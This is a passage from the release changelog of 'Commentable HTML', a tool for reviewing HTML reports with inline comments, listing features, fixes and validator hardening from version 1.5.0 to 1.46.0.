  `tools/validate.py` warns when a `<pre><code class="language-XXX">` block declares a language the
  author-time highlighter supports (resolving aliases like `cs` to `csharp`) but carries no
  `cmh-code-*` spans, so it renders as plain monochrome text. Inline code, non-highlightable labels
  (`language-text`, `language-kusto`), and already-highlighted blocks are not flagged.

### Fixed

- The showcase demo's Python code block is now syntax-highlighted (it previously shipped as a plain
  `language-python` block, which the new validator check flags).

## [1.46.0] - 2026-07-14

### Added

- Search within comments. The comments panel now has a single search field (with a leading
  magnifier and a clear X button) that filters the comment cards to only those whose text - the
  note, the quoted content, the section path, and the pin - matches the query case-insensitively.
  A shown/total count sits beside the field, a no-results note appears when nothing matches, and
  the filter re-applies after every render so it survives adding, editing, or sorting comments.

## [1.45.0] - 2026-07-14

### Changed

- The comments panel resizes narrower. The drag/keyboard minimum width dropped to 3/5 of the former
  floor - 192px on wide screens (was 320px) and 144px on narrow screens under 700px (was 240px) - so
  the panel can take less horizontal space and leave more room for the document. The panel's CSS
  `min-width` floor was lowered to match, and the width still clamps to the viewport and persists
  across reloads.

## [1.44.0] - 2026-07-14

### Added

- Layered checklists. A `data-cmh-checklist` container turns a nested list (or a table) into
  interactive four-state item checkboxes (blank / check / cross / question) drawn with inline-SVG
  icons. A branch item aggregates over its direct children (all-same shows that state, any
  disagreement shows a neutral mixed marker), and clicking a branch propagates its next state to
  every descendant leaf. Item labels stay ordinary commentable content; only the injected icon
  control is `cm-skip`. Hierarchy comes from DOM nesting for lists, or an explicit `data-cmh-parent`
  reference for tables, which cannot nest rows and may be sorted.
- Minimal checklist persistence. Only leaves whose state differs from their authored `data-cmh-state`
  baseline are stored, as one-character codes under `COMMENT_KEY + "::cl"`; returning a leaf to its
  baseline prunes its entry, so a large checklist with a few edits costs a few bytes.
- Per-list checklist change card. The sidebar renders one non-comment card per checklist with
  changes, placed by document order, with a jump button and a Reset button that reverts that
  checklist to its authored state. Copy all gains a `## Checklist "<id>"` section plus a
  machine-readable `CHECKLIST_STATE_JSON` line, an unsaved change flips the badge to Not portable,
  and every export bakes the current states into `data-cmh-state`. A checklist that loads with a
  persisted change opens the sidebar so the card is seen.
- Two checklist tools. `tools/checklist_scaffold.py` generates list or table markup with stable ids
  from an indented outline, and `tools/checklist_apply.py` cements the reviewer's states from a
  Copy-all bundle (or `--state-json`) back into the source HTML. `validate.py` gains checklist checks
  (duplicate ids, invalid tokens, empty lists, unresolved parents) that a checklist-free document
  ignores. See the bundled `references/checklist-contract.md` for the authoring contract.
- A shipped demo report `examples/report-checklist.html` (Release readiness review) that showcases both
  checklist shapes - a nested-list sign-off checklist and a sortable-table component audit linked by
  `data-cmh-parent` - with its companion authoring prompt `examples/prompt-checklist.md`.

## [1.43.0] - 2026-07-14

### Changed

- Clarify the README privacy wording: the document and comments are "never uploaded, transmitted, or
  sent to any external service - not to us, and not to anyone else", dropping the confusing "not to
  the agent" (you do paste the Copy all bundle to your agent yourself, so listing the agent among the
  never-sent destinations read as contradictory).

## [1.40.0] - 2026-07-14

### Added

- A "Privacy and compliance" section in the packaged README and a "Private by design" section on
  the plugin site page (linked from the nav), emphasizing that the document and every comment stay
  local - in the browser's `localStorage` or embedded in your own HTML file - are never uploaded or
  sent to any external service, and that only the Mermaid/Chart.js rendering libraries load from a
  CDN (not your data) while Export Offline strips even that for air-gapped, sensitive, or regulated
  use.

## [1.39.0] - 2026-07-14

### Changed

- The Help & About panel now links the author's name, "Uri Kanonov", to
  `https://github.com/urikanonov` (opens in a new tab), reusing the existing brand-link style.
- Help panel text now names the triage board's `Reset moves` button and the board-moves comment
  card's `Reset changes` button, and refers to the Help toggle by its exact on-screen label,
  `Help & About`, instead of the shorthand `Help`.

## [1.38.0] - 2026-07-14

### Added

- A shipped example deck `examples/deck-roadmap.html` (Autumn Roadmap Review) plus its companion
  authoring prompt `examples/prompt-roadmap.md`. The deck is a `kind=slides` document with a
  fixed 1920x1080 stage of six commentable slides (title, current-state stats, themes table,
  mermaid architecture diagram, three-column risk board, and the ask), giving reviewers a real
  deck target for the same commenting workflow the report demos exercise.
- `build.py`'s example pipeline now covers `deck-*.html` sources alongside `report-*.html`, so a
  deck source in `dev/examples-src/` regenerates its shipped copy under `pkg/**/examples/` and
  `build.py --check` catches a hand-edit or a stale/clobbered deck example. The site demos list
  syncs the deck under `site/commentable-html/demo/` next to the report demos.

## [1.37.0] - 2026-07-14

### Fixed

- The diff-line Add Comment hover button (`#diffAddBtn`) is now vertically centered on the hovered
  row, so moving the pointer to click no longer jumps to the line above.

### Added

- Commentable code blocks, including KQL query blocks, now show per-line numbers in a
  `.cmh-code-gutter` overlay via CSS-generated counters. The numbers are visible in the UI but
  excluded from text selection and clipboard output, including each block's Copy button.

## [1.36.0] - 2026-07-14

### Added

- The `cmh` shorthand now discovers the skill: it is a `plugin.json` and marketplace keyword, and
  the `SKILL.md` front-matter discovery description ends with an explicit `Also triggers on the
  shorthand cmh.` clause, so typing `cmh` auto-triggers the skill and matches it in marketplace
  search.

## [1.35.0] - 2026-07-14

### Added

- Triage-board (and any `[data-cm-widget][data-cm-draggable]` widget) Reset controls. A moved board
  now grows a runtime-injected "Reset moves" button in its corner whenever its layout differs from
  the load-time baseline; clicking it returns every card to its original slot and order, and the
  button disappears once there are no moves. Static (non-draggable) widgets never get the button.
- Per-widget layout-change state cards. The sidebar now renders one "Layout change" card per widget
  that has moves, each with a jump button that scrolls to and flashes that board and a "Reset
  changes" button that restores only that widget. Each card mirrors a regular comment card's shape:
  an `in: <board>` title (the widget aria-label, else its name) and a meta line showing the
  first-change datetime, alongside the existing explanatory note.

### Fixed

- A chart caption sitting directly below a tall `cm-skip` chart is now commentable. The desktop
  `mouseup` handler evaluates the selection before bailing on a `cm-skip` target, so selecting a
  short caption still offers Add Comment even when the pointer releases over the adjacent chart
  canvas.
- The runtime footer no longer spans wider than the content column. Its box now aligns to the
  `#commentRoot` content width in both the normal and the sidebar-open layout.

## [1.34.0] - 2026-07-13

### Changed

- The shipped example reports (`examples/report-*.html`) are now pure build artifacts assembled
  from an independent content source in `dev/examples-src/`. `build.py --check` compares each
  shipped example to a fresh assembly, so a hand-edit or a stale/clobbered example - of its content
  as well as its layer - now fails the build instead of comparing equal to itself. Edit demo content
  in `dev/examples-src/`, not in the shipped file.

### Accessibility

- The comments-panel toggle and the overflow-menu trigger now declare the element they control with
  `aria-controls` (`#sidebar` and `#toolbarMenu`), so assistive technology can associate each toggle
  with its target.

## [1.33.0] - 2026-07-13

### Fixed

- Export as Portable no longer corrupts a comment whose body contains `$&`, `$1`, `` $` ``, `$'`, or
  `$$`: the saved-HTML builder now uses a function replacer so `String.replace` cannot expand those
  `$`-patterns from the comment text.
- Export as Plain now recognizes region markers with any number of `=` fill characters (matching the
  validator's grammar) when stripping the comment-UI, embedded-comments, and script regions, and the
  post-export leak guard now matches `id="handledCommentIds"` / `id="embeddedComments"` regardless of
  quote style, so a Plain export cannot silently ship comment data.
- The strict validator now rejects a report whose top-level lede exists but is empty: a document must
  carry a non-empty top-level `<h1>` title, not just the lede wrapper class.

### Added

- The plugin site page now showcases the commentable-decks capability in the "What you get" section.

### Changed

- The deck authoring guide runs the deck validator with `--strict`, and the tutorial's Show/Hide
  wording matches the actual toolbar behavior.

## [1.32.0] - 2026-07-13

### Added

- Commentable decks: a built-in deck capability powered by a curated, pristine subset of the frontend-slides skill (MIT, (c) 2025 Zara Zhang) vendored under `vendor/frontend-slides/`. The Vercel deploy script and the PDF-export script are excluded, and a required CI gate (`dev/tools/check_vendor.py` plus a SHA-256 `MANIFEST.sha256`) fails on any unknown, changed, removed, or reintroduced file. See `vendor/frontend-slides/UPSTREAM.md` and `dev/frontend-slides-upstream-sync.md`.
- Author-time deck tools under `deck/`: `deck_scaffold.py` builds a create-only, commentable-native fixed-stage deck with legible presentation defaults (light slide text and presentation-scale typography on the dark stage, overridable by a design pass) - each slide carries a stable `data-slide-id`, the inline editor and localStorage autosave are stripped, and fonts are self-hosted - and fails closed on the deck contract before writing; `pptx_to_fragment.py` HTML-escapes extracted slide text, schema-validates the input, vets every image path as local-relative, and fails closed without `python-pptx` (speaker notes are not supported); `deck_validate.py` enforces the deck contract fail-closed using an HTML parser (robust to solidus, entity-encoded, unquoted, and SVG bypasses), rejecting remote fonts/media/CSS, active content, and `javascript:`/`../` URLs while allowing external hyperlinks. The runtime interface both sides build against is documented in `references/deck-contract.md`.
- A "Deck capability (frontend-slides)" flow in `SKILL.md`: detect a presentation request and confirm, optionally convert a `.pptx` (preferring the Anthropic `pptx` skill when installed, else the local extractor), scaffold, fill, validate, then comment on the live deck and iterate in place. Mermaid and Chart are supported; Export Offline produces the network-silent shareable artifact.
- A runtime deck profile in the commentable-html layer, activated only by `data-cmh-mode="deck"` on the real content root: it exposes a `window.__cmhDeck` controller, scales the fixed 1920x1080 stage (refit via a `ResizeObserver`), and replaces the flow-document chrome (heading anchors, collapsible carets, side TOC, footer, scroll progress) with a full-screen presentation - a **present mode** that hides the comment sidebar/toolbar plus a slide-oriented control bar (Prev, a live `N / total` slide counter, Next, with WCAG-2.5.3 aria-labels and boundary-disabled buttons) and keyboard / id navigation (guarded against out-of-range and editable-target keypresses). A **comment mode** toggle reveals the sidebar, insets and force-reveals the stage, and gates the navigation keys; a comment card jumps to (activates) its owning slide with highlights restoring on hidden slides. Non-deck documents are unaffected.
- Dev tooling: `dev/tools/audit.mjs`, an AI-driven UX audit harness that tours any commentable HTML across viewports and colour schemes and emits screenshots plus machine observations for one or many agents to review (see `dev/AUDIT.md`). Not shipped.

### Changed

- The mermaid CDN import is now gated on the presence of a `pre.mermaid` / `div.mermaid` element, so a diagram-free document (including a deck) makes no external network request at all. A document that contains a diagram still loads and renders mermaid.

## [1.31.0] - 2026-07-13

### Changed

- In the sidebar's narrow layout the export buttons now pack two per row (Portable | Offline, then Markdown | Plain HTML) instead of one full-width button per row, so the actions take less vertical space and are quicker to scan. The Clear button keeps its own full-width row so the destructive action stays visually apart.

## [1.30.0] - 2026-07-13

### Fixed

- Hardening pass from a multi-model audit of the day's merged changes. Six latent robustness and correctness defects are fixed, each covered by a test that reproduces the defect before the fix. No shipped example, template, or fixture changed behavior; they all still validate clean.
- `tools/validate.py` KQL run-link rule (`CMH-KQL-07`) now treats a framed `figure.cmh-kql` whose `cmh-kql-run` link points anywhere other than `https://dataexplorer.azure.com/` as a hard error instead of a warning. The href is HTML-entity decoded and URL-parsed (not substring-matched), so a `javascript:`, `data:`, non-ADX, or look-alike-host link fails validation. The "has a run link" check now looks for a real `<a>` element carrying the `cmh-kql-run` class token, so a figure whose query text merely mentions `cmh-kql-run` no longer passes as if it had a link. A bare `<pre>` KQL block stays exempt.
- `tools/validate.py` transient-body-class guard (`CMH-VAL-10`) now inspects the REAL parsed `<body>` element instead of the first raw `<body ...>` token in the file, so a decoy `<body class="sidebar-open">` inside a `<head>` script or comment can no longer hide a dirty real body or trigger a false positive.
- `tools/validate.py` report/plan title rule (`CMH-KIND-01`) now requires a TOP-LEVEL `<h1>` (a direct child of `#commentRoot`, or a lede-wrapped `<header class="cmh-lede"><h1>`), matching `new_document.py`. An `<h1>` nested only inside a deeper `<section>` no longer satisfies the rule.
- `assets/commentable-html.js` document-comment context menu (`CMH-DOCCMT-02`) no longer vanishes on a macOS-style Ctrl-click: the `mouseup` cleanup is suppressed for any context-menu gesture (`button === 2 || ctrlKey`), not right-click alone.
- `assets/commentable-html.js` export body-class normalizer (`CMH-EXP-09`) now operates only on the first `<body>` open tag, handles double-quoted, single-quoted, and unquoted class values, matches whole class tokens (a superstring like `x-sidebar-open` is preserved), and removes an emptied class attribute, so it can no longer mutate a `<body class=...>` literal that appears later in page content or a script.
- `tools/upgrade.py` and `tools/retrofit.py` kind-meta handling (`CMH-KIND-02`, `CMH-KIND-03`) now detect an existing `commentable-html-kind` meta by parsing head metadata order-independently (including a non-canonical `content`/`name` attribute order). `upgrade.py` no longer appends a duplicate meta to a document that already declares a kind, and `retrofit.py --kind` replaces an existing kind meta in place instead of appending a second one.

### Changed

- `references/validation.md` error list now documents the mandatory/unknown `commentable-html-kind` meta (with the report/plan top-level `<h1>` sub-rule) and the transient body-state class guard, matching the authoritative error list `SKILL.md` points to.

## [1.29.0] - 2026-07-13

### Fixed

- The template and shipped example reports no longer bake the transient runtime `sidebar-open` body class into `<body>`. `sidebar-open` is a UI-state class the layer toggles on `document.body` as the panel opens and closes; hardcoding it in `assets/template.shell.html` meant every generated document, both `dist/` templates, and all four `examples/report-*.html` shipped with `<body class="sidebar-open">`, which rendered a fresh document full width with an empty reserved right gutter (the `body.sidebar-open .app` layout rule) even when the sidebar panel is not shown. The template and examples now ship a plain `<body>`, and the runtime derives the sidebar state on load (open when the document has restored comments, closed otherwise). Where 1.28.0 stripped the class on export, this removes it at the source.

### Added

- `tools/validate.py` now errors when a document's `<body>` open tag carries a transient runtime UI-state class (`sidebar-open`, `cm-sidebar-resizing`, or `cm-widget-dragging`), so a persisted transient state can never ship. The check inspects only the `<body>` open tag, so a legitimate CSS/JS reference to `sidebar-open` is not flagged. New specs `CMH-BUILD-06` (no shipped document bakes the class) and `CMH-VAL-10` (the validator guard), covered by `dev/tests/test_build.py`, `dev/tests/test_new_document.py`, `dev/tests/test_examples.py`, and `dev/tests/test_validate.py`.

## [1.28.0] - 2026-07-13

### Fixed

- Exports no longer bake transient runtime body-state classes into the saved file. Every export path (Save, Export as Portable, Export Offline, and Export to Plain HTML) now strips `sidebar-open`, `cm-sidebar-resizing`, and `cm-widget-dragging` from the exported `<body>` open tag, so a stale or open-sidebar source can no longer persist that state and propagate it across re-exports. A stuck `sidebar-open` made the document render full width with an empty right gutter (the `body.sidebar-open .app` layout rule) for a sidebar that is not shown. Non-transient body classes are preserved, and the live layer re-derives the sidebar state on load. The normalization is centralized in `_getBaseHtml()` (covering the on-disk and `file://` snapshot bases) and shared with the Plain export via a new `_stripTransientBodyClasses()` helper. New spec `CMH-EXP-09` and `dev/tests/54-export-body-normalize.spec.js` cover all four export paths.

## [1.27.0] - 2026-07-13

### Added

- Every shipped example report now has a companion example-prompt file. Added `examples/prompt-triage.md` and `examples/prompt-metrics.md` (matching the existing `prompt-community-garden.md` and `prompt-taxi.md` format) so all four examples document the one-paragraph prompt that generates them.
- Full interaction coverage for the incident triage board and commentable visuals matrix examples: a new `dev/tests/53-more-examples.spec.js` exercises both reports over http with prose commenting, widget/part commenting, UI-control clicks, and a seeded randomized monkey pass, asserting no uncaught page errors and comment persistence across reload. Each of the four shipped examples is now covered by validation, monkey, commenting, and clicking.
- New spec guards: `CMH-DEMO-02` (every report has a companion prompt with the standard headings and a non-empty blockquote) and `CMH-DEMO-03` (each example is exercised by the interaction/monkey suite), plus an example-scoped assertion under `CMH-BUILD-05` that no shipped example carries the removed "TEMPLATE / DEMO" header phrases.

## [1.26.0] - 2026-07-13

### Changed

- The "Run in Azure Data Explorer" deep link is now mandatory on a framed KQL figure. `tools/validate.py` rejects a `figure.cmh-kql` that has no `cmh-kql-run` link as a hard error (non-zero exit in the default, non-strict mode) instead of a warning, so a framed KQL block can never ship without the reader's one-click path into Azure Data Explorer. Build the link with `tools/kusto_link.py`. A purely illustrative query with no real cluster/database should use a plain `<pre>` code block, which remains exempt from the rule.

## [1.25.0] - 2026-07-13

### Changed

- Generated documents no longer carry the leading "Commentable HTML - TEMPLATE / DEMO" documentation comment. That guidance duplicated the skill references and mislabeled real reports as a template or demo, so every shipped report and generated document is now leaner and cleaner without it.

## [1.24.0] - 2026-07-13

### Changed

- Aligned the skill with Anthropic's Agent Skills authoring guidelines (documentation only, no runtime or tool behavior change). Rewrote the `SKILL.md` front-matter description into a what-plus-when discovery string with an explicit `Use when ...` trigger clause scoped to HTML artifacts, linked `references/forward-compatible-layout.md` directly from `SKILL.md` so every reference is one level deep, added a `## Contents` table of contents to each reference longer than 100 lines (charts, exports, document-layout, comment-data-shape, retrofitting), documented the Markdown-to-HTML reviewer path, removed legacy UI-label and past-version wording from the Charts and Exports references, and removed a time-relative phrase from the Interaction-model reference. The repository `README.md` plugin row was aligned with the new description.
- Added spec-covered guards for the above (`CMH-DOC-05` reference tables of contents, `CMH-DOC-06` front-matter description, `CMH-DOC-07` direct reference links, `CMH-DOC-08` SKILL/marketplace description consistency), each validated by a covering test in `dev/tests/test_docs_diagrams.py`.
- Deferred: trimming the `SKILL.md` body toward Anthropic's ~5k-token soft cap is intentionally left to a focused follow-up, because the body carries pinned generation contracts (`CMH-DOC-02`/`CMH-DOC-03`) that a de-duplication pass should not churn in the same change.

## [1.23.0] - 2026-07-13

### Fixed

- A real desktop right-click on empty document space no longer flashes the document-comment menu open and then hides it: the right-button `mouseup` no longer runs the text-selection cleanup that queued a `hideMenu()` clobbering the just-opened menu.

### Changed

- The sidebar Copy all button is larger and bolder so the most-used action is easier to find and click.

## [1.22.0] - 2026-07-13

### Added

- Documents now declare their kind in a mandatory `<meta name="commentable-html-kind">` (report, plan, slides, board, or generic). The validator requires it and enforces per-type rules: report and plan must carry a top-level `<h1>` title, while slides, board, and generic do not.
- `new_document.py` and `retrofit.py` require `--kind` and stamp the meta; report and plan auto-add a title from `--label` when the fragment has none, while slides and board do not.

### Changed

- `upgrade.py` now adds a default `generic` kind meta to a document that predates kinds, so upgrading an older document produces one that still validates.

## [1.21.0] - 2026-07-13

### Added

- Added `tools/retrofit.py` to deterministically inject the commentable layer into existing unlayered HTML with validation-before-write, root selection, Portable output, companion-asset options, and host chrome skip selectors.

### Changed

- Trimmed `SKILL.md` by moving runtime UI, interaction, NonPortable, network, and manual retrofit details into existing references while keeping generation-time routing, caveats, and commands inline.

## [1.20.0] - 2026-07-12

### Fixed

- Offline export now blocks form submissions in CSP, removes remote form targets, keeps benign inline scripts with non-network dynamic import comments, and preserves custom canvas renderers that are not chart snapshots.
- Strict offline validation now requires the restrictive CSP and rejects network form targets, meta refresh redirects, and network CSS `url(...)` values in style blocks or inline styles.
- Offline validation now ignores non-fetching remote links such as canonical and alternate metadata while still blocking fetching link relations.
- Region marker guards in validation, upgrade, build, and runtime export now count only comment-delimited infra markers, so marker text inside prose or code blocks no longer causes duplicate-region failures.

## [1.19.0] - 2026-07-12

### Fixed

- Offline export now adds a zero-network CSP, removes event-handler attributes, strips same-origin absolute media and additional preload/media/SVG/CSS/refresh egress vectors, and validates offline documents with no Chart.js CDN exemption.
- Region replacement tools and runtime export slicers now reject duplicate BEGIN or END markers instead of risking content loss.
- Validator hardening now rejects protocol-relative and non-file companion refs, descriptor id decoys, and commented `data-id="commentRoot"` false positives.
- Save, Portable, and Offline exports now filter handled comments so resolved feedback cannot reappear in exported embedded comment JSON.
- Markdown export now summarizes offline chart snapshots by label instead of embedding base64 chart images.

## [1.18.0] - 2026-07-12

### Added

- Documented widget drag opt-in, the Offline badge state, Export Offline, and when to use NonPortable, Portable, or Offline outputs.

### Fixed

- Exporting after widget moves now refreshes plain-text comment offsets against the exported widget layout, so comments near moved cards reopen on the intended text.
- Floating chart, mermaid, diff, widget, and text-comment bubbles now respect horizontally clipped rich-content containers instead of drifting outside scrolled charts, tables, diagrams, or raw diffs.
- Document-type badges now announce Portable, Offline, and Not portable state changes through a polite live region and expose the reason through `aria-label`.
- The dependency cooldown gate now diffs lockfiles by package name and version, uses lockfile entry names for aliases, discovers package-lock files dynamically, deduplicates registry lookups by package name, applies a global deadline, and warns when changed non-registry dependencies are not cooldown-checked.
- The forward-compatible layout reference now clarifies that `validate.py --strict` validates the current contract only and legacy pre-1.15 documents must be regenerated or upgraded before validation.

## [1.17.0] - 2026-07-12

### Fixed

- Offline export now preserves embedded comment data scripts even when comment text mentions remote imports, strips bare remote module imports, neutralizes remote media attributes, and keeps descriptor decoys from stealing the real offline mode update.
- Widget drag-and-drop now treats drops onto nested slots inside the dragged part as no-ops, always clears drag state, preserves click-to-comment behavior below the drag threshold, avoids reporting origin-slot no-ops as moves, and saves moved widget layouts into Portable exports.
- Example regeneration now rejects duplicate region BEGIN markers instead of silently slicing through authored content.
- The dependency cooldown gate now fails open when npm registry packuments have a null or malformed `time` map.
- The dependency cooldown gate and related test helpers now emit stable sorted failure output.
- The mobile rich-content test now proves genuinely wide chart or mermaid blocks can scroll horizontally instead of relying on tautological scroll metrics.
- Plain export and layer retargeting now ignore `data-id="commentableHtmlLayer"` decoys when locating the real descriptor.

## [1.16.0] - 2026-07-12

### Added

- Offline exports now declare descriptor mode `offline`, reopen with an Offline badge, preserve that mode when
  edited, and validate offline chart snapshots as first-class portable artifacts.
- Triage board cards can opt in to mouse drag-and-drop with `data-cm-draggable`, and moved cards are copied as
  widget layout changes.

### Fixed

- Mermaid diagrams and chart figures now stay inside narrow mobile viewports by scrolling wide rich content inside
  their own blocks.
- Shipped prose now refers to the user-facing skill as Commentable HTML while preserving the `commentable-html`
  identifier in commands, paths, and code.

## [1.15.0] - 2026-07-12

### Added

- Generated documents now publish a machine-readable `commentableHtmlLayer` descriptor that records the
  layer version, output mode, and infra region marker names in document order.
- `#commentRoot` now carries `data-cmh-content-root`, giving future tooling a stable hook for content roots.
- The forward-compatible content/infra layout contract is documented in `references/forward-compatible-layout.md`.

## [1.14.0] - 2026-07-12

### Changed

- Top-level prose is no longer width-capped. Ordinary paragraphs (and the lede) now fill the full
  content column, the same width as tables, figures, code, and callouts, so prose no longer renders
  narrow next to full-width content in wide reports. The previous 72ch readable-measure cap is removed.

## [1.13.0] - 2026-07-12

### Added

- Added two shipped live demo reports: an incident triage board with commentable widget columns and cards, and a
  visuals matrix covering flowchart, sequence, gantt, state, class, ER, and pie mermaid diagrams, four Chart.js
  chart kinds, a code-review diff, a KQL block, and an SVG figure.
- Export to Markdown now preserves `data-cm-widget` boards as a widget note plus a GFM table, so the triage board
  survives Markdown export instead of being skipped as `cm-skip` chrome.

## [1.12.0] - 2026-07-12

### Added

- Added **Export Offline**, which builds a Portable export with current comments, snapshots rendered
  mermaid diagrams as inline SVG, snapshots chart canvases as PNG data images, removes remote rich-content
  loaders, and produces a strict-valid zero-network HTML handoff.

## [1.9.1] - 2026-07-12

### Added

- The shipped plugin `README.md` and `SKILL.md` now explain why commentable-html beats planning in chat, a
  Markdown file, or plain HTML - a medium-comparison table plus a reference to Anthropic's "unreasonable
  effectiveness of HTML" blog post - so the motivation matches the project website.

## [1.9.0] - 2026-07-12

### Added

- `new_document.py` now defaults NonPortable companion references to absolute `file://` URLs that point at
  the installed skill `dist/`, so the generated HTML can move anywhere on the same machine without losing
  its CSS/JS. Use `--assets-relative` to restore the old relative-path behavior for a movable folder bundle.
- The NonPortable asset banner now has an accessible `Dismiss` button. A dismissed version warning stays
  hidden across reloads for that document key and page/runtime version pair.
- The SKILL.md documents the page/runtime compatibility contract: same-major newer runtimes can open older
  same-major pages without warning, and breaking page/runtime changes require a major version bump.

### Changed

- The NonPortable version handshake is now semver-aware. Same-major older pages no longer show a scary
  mismatch banner after a safe skill update, newer same-major pages show a soft update notice, and
  different-major pages show the incompatible-runtime warning.
- `validate.py` treats only `http://` and `https://` companion refs as remote/CDN URLs. Local `file://` refs
  and absolute filesystem paths are accepted, while plain absolute filesystem paths still warn that they are
  local-only.

## [1.8.0] - 2026-07-12

### Added

- Two mermaid diagrams in `references/exports.md` (linked from the SKILL.md Output modes section)
  showing what is bundled in the file versus fetched from where: Portable inlines the layer CSS/JS,
  NonPortable loads the `commentable-html.{css,js,assets.js}` companions from the skill `dist/`, and both
  keep the plan content and comments inline while fetching optional mermaid/Chart.js from a CDN.
- The `analysis`, `plan`, and `report` keywords, and the "drastically shortens the AI planning and
  iteration loop" framing in the SKILL.md intro and the plugin READMEs. The marketplace category is now
  `planning and analysis`.
- The brand mark now links to the project site
  (`https://urikanonov.github.io/ai-marketplace/commentable-html/`) in a new tab, in the footer (icon plus
  versioned name) and on the sidebar meta-row brand icon. The link is chrome, so it never leaks into a Plain
  HTML export.
- The Help modal title now includes the running layer version (`Commentable HTML v<version> - Help`).
- Each overflow (`...`) menu item (Show, Export as Portable, Export to Plain HTML, Export to Markdown,
  Help & About) now carries a leading decorative icon matching the chrome icon style.

### Changed

- `Export to Markdown` is now download-only: it downloads the `.md` file and no longer writes the clipboard.
  The toast, Help topic, button tooltips, SKILL.md, and `references/exports.md` were updated to drop the
  clipboard claim.

### Fixed

- On touch / coarse-pointer devices the "Add Comment" popup now appears when a text selection settles.
  Selecting text on a phone drags the native handles and never fires `mouseup`, so the popup previously
  never showed; a debounced `selectionchange` now raises the same popup (and hides it when the selection
  collapses). Desktop mouse behavior is unchanged.

## [1.7.0] - 2026-07-11

### Fixed

- Export on `file://` no longer drops content authored after the layer script. The export base is now
  captured from the fully parsed DOM at export time (then re-stripped of runtime artifacts) instead of a
  snapshot taken before late content (for example a `chart_block` chart placed after the layer) was parsed.
- `Export as Portable/Standalone` finds the embedded-comments script regardless of its attribute order, and
  aborts with a clear error when the companion assets version does not match the running runtime.
- `Export to Markdown` now serializes `<strong>`/`<em>`/`<a>`/`<code>`/`<img>` that are direct children of a
  list item, and its URL allowlist keeps only image data URLs (a bare `data:` destination is neutralized
  while `data:image` is preserved).
- Image/canvas comment highlights clear and flash correctly on `<canvas>` widgets, not just `<img>`.
- Duplicate persisted comment ids are de-duplicated on load so a corrupted store cannot render twin cards.
- `generate_toc.py` and `validate.py` reset the `#commentRoot` scope on the root's closing tag, so a heading
  or cross-reference in a later footer or sibling container is no longer collected into the TOC or validated
  as document content.
- `validate.py` accepts cache-busted companion references, stripping a `?query`/`#fragment` before the
  `.js`/`.css` suffix and the on-disk existence check.
- `diff_block.py` preserves a file-final-newline-only difference and emits the standard
  `\ No newline at end of file` marker instead of silently dropping it.
- `new_document.py` refuses NonPortable output to stdout unless `--assets-href` is given, because bare
  companion names written to a stream are unreachable; its `--key-from-source` help no longer claims a
  `--label` fallback.
- `chart_block.py` adds its own tools directory to `sys.path` on import so the sibling `validate` module is
  importable and self-validation is never silently skipped.
- `--help`/`-h` now exits 0 with usage on every shipped tool (`validate.py`, `kql_highlight.py`,
  `kusto_link.py`, `mark_handled.py`, and the rest), instead of treating the flag as a filename.
- `new_document.py --key auto` derives the comment key from the output/source path identity rather than the
  label, so two documents that share a title no longer collide and leak comments across each other.
- The lede/intro block is no longer clamped by the 72ch prose measure, so it renders at the section width.
- The confirm dialog always traps Tab and pulls escaped focus back to Cancel; Escape closing the toolbar
  overflow menu or the add-comment menu restores focus and no longer discards an open composer draft; the
  side-TOC highlights the last section once the page is fully scrolled.

### Added

- Headings are keyboard-focusable with a visible focus style and Enter/Space activation for the deep-link /
  add-comment affordance, matching the mouse-only behavior.
- Generated documents carry a visible themed document title (`#commentRoot > h1`); `new_document.py` adds a
  visible `<h1>` from `--label` unless the fragment already has one or `--no-title` is passed.
- The trust boundary is documented in `SKILL.md` and `new_document.py --help`: authored content is trusted
  HTML and is not sanitized; callers must sanitize untrusted host HTML before wrapping it.
- A `new_document.py` quickstart example in the plugin README; `retrofitting.md` documents the
  `window.__cmh*` / `__commentable*` introspection globals.

### Changed

- `validate.py` requires `headingAddBtn`, `widgetAddBtn`, and `menuDocComment`, and its stale version note
  now points at the correct removal version.
- `upgrade.py` matches its replace regions by exact begin/end markers; the composer placeholder documents the
  `Ctrl/Cmd+Enter` save shortcut; `kusto_link.py` and the dev tests use public/generic cluster, path, and
  database names in place of internal ones.
- `build.py` now regenerates the example reports' layer regions and version stamps from the freshly built
  dist and covers them in `--check`.
- Both export modes download `<stem>-portable.html`; the NonPortable "Export as Portable" no longer emits a
  `<stem>.standalone.html` filename.

## [1.6.1] - 2026-07-11

### Added

- The Help `Getting started` topic now embeds the review-loop diagram (the agent-to-you-and-back
  loop) beneath the four steps, themed with the framework's light/dark variables so it follows the
  active theme.
- A `Website and live demo` link in the Help About block, pointing at the plugin's GitHub Pages page.

### Changed

- Merged the `The review workflow` and `Getting started` help topics into a single, default-open
  `Getting started` topic, removing the overlap between them.
- Reworded the `Self-contained and privacy` help topic: comments are stored in this browser's
  `localStorage` (private, never uploaded, no account), and the review layer travels inside the file
  only in Portable mode - a Not portable file references small companion resources. It no longer
  implies the layer is always bundled into the file.

## [1.6.0] - 2026-07-11

### Changed

- Adopted mermaid 11: the shipped page templates (`dist/PORTABLE.html`, `dist/NONPORTABLE.html`) and the
  example reports now load `mermaid@11.16.0` from the CDN, and the commenting layer is verified to render,
  anchor, and comment on mermaid 11 diagrams (full Playwright suite green against mermaid 11). This rode in
  on a dev/test-only dependency bump (mermaid 11.16.0, chart.js 4.5.1, adm-zip 0.6.0); none of those dev
  dependencies ship in the plugin.

## [1.5.1] - 2026-07-11

### Changed

- Polished the review-loop diagram (`docs/images/review-loop.svg` and its site twin): the step labels use
  consistent casing ("1. Generates HTML", "2. Comment Inline"), and the "reload and repeat" caption became
  a fourth curved arrow from the AI agent back to you, so the loop reads as a closed cycle.

## [1.5.0] - 2026-07-11

### Added

- Commentable widgets and SVG nodes. A generic opt-in contract (`data-cm-widget`, `data-cm-part`,
  optional `data-cm-part-label`, and `data-cm-slot`) makes individual parts of an interactive widget
  or a labeled SVG `<g>` node commentable, with a hover/keyboard Add Comment affordance and a
  `widget` anchor type that restores across reloads and exports.
- Widget layout-change tracking. When parts sit in `data-cm-slot` containers, drag/drop moves are
  detected against the load-time baseline and surfaced as a synthetic sidebar card and a "Widget
  layout changes" section in the Copy-all bundle; the document is flagged Not portable until it is
  re-exported.
- Document-wide comments. Right-clicking empty space adds an unanchored, whole-document comment
  (`document` anchor type) that carries no highlight and copies as a document-wide anchor.
- Export to Markdown. A new sidebar and overflow-menu action copies the document content to the
  clipboard and downloads a `.md` file via a deterministic, block-by-block conversion (headings,
  lists, GFM tables, fenced code / diff / mermaid / kusto, callouts as GitHub alerts, charts and
